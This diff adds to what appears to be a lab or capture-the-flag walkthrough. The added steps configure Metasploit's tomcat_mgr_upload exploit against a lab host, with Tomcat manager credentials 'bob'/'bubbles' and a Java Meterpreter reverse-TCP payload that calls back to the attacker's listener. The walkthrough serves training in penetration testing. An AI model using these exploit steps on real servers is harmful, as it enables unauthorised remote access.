@@ -423,4 +423,77 @@ msf6 > use 3
 msf6 exploit(multi/http/tomcat_mgr_upload) > 
 ```
 
+- Set required options using the set command
+
+```
+msf6 exploit(multi/http/tomcat_mgr_upload) > options                                                                                                     
+                                                                                                                                                                
+Module options (exploit/multi/http/tomcat_mgr_upload):                                                                                                          
+                                                                                                                                                                       
+   Name          Current Setting  Required  Description                                                                                                                   
+   ----          ---------------  --------  -----------                                                                                                                        
+   HttpPassword                   no        The password for the specified username                                                                                                 
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.16.70.107    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_upload) > 
+```
+- Required options with user name and password attribute
+
+```
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.208.216
+rhosts => 10.10.208.216
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
+rport => 1234
+```
+
+```
+msf6 exploit(multi/http/tomcat_mgr_upload) > options 
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword  bubbles          no        The password for the specified username
+   HttpUsername  bob              no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        10.10.208.216    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT         1234             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun0             yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+```
+
 
